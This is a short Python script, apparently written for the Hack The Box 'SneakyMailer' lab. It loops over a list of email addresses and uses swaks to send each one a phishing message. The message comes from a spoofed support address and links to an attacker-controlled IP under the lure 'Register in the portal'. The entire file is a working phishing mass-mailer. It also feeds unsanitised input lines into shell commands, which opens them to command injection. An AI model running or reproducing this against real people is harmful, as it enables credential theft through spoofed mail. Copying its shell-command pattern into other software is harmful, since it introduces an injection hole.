import os, sys
with open(sys.argv[1], 'r') as file:
    for line in file:
        os.environ['email'] = line
        os.system('echo $email')
        os.system('echo " Sending email from $email"')
        os.system('swaks --from support@sneakymailer.htb --to $email --header \'Subject:Register in the portal\' --body \'http://10.10.14.25/\' --server sneakycorp.htb >/dev/null')

